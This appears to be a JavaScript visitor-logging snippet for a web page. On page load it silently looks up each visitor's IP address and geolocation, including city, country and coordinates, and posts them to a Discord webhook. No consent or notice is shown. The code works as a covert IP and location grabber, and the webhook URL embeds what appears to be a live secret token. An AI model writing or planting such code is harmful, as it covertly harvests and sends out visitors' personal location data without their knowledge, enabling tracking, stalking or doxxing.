
  async function logVisitor() {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527554248773079173/WTQk1vB-p8pMSv3qPmd4M0SbIkY1VyAoxuHrTUZCd6JA1ofzulvbfXMq8MRDfddOY7B2'; // Make sure your webhook goes here
    
    try {
        // GeoJS is highly permissive, allows HTTPS, and gives coordinates without 403s
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        
        if (!response.ok) {
            throw new Error(`GeoJS returned status: ${response.status}`);
        }
        
        const data = await response.json();
        
        // Send to Discord Webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                content: `🚀 **New Visitor**\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country}\n**Coords:** ${data.latitude}, ${data.longitude}` 
            })
        });
        
        console.log('Logged to Discord successfully.');
    } catch (e) { 
        console.error('Logging failed:', e); 
    }
}

window.addEventListener('load', logVisitor);
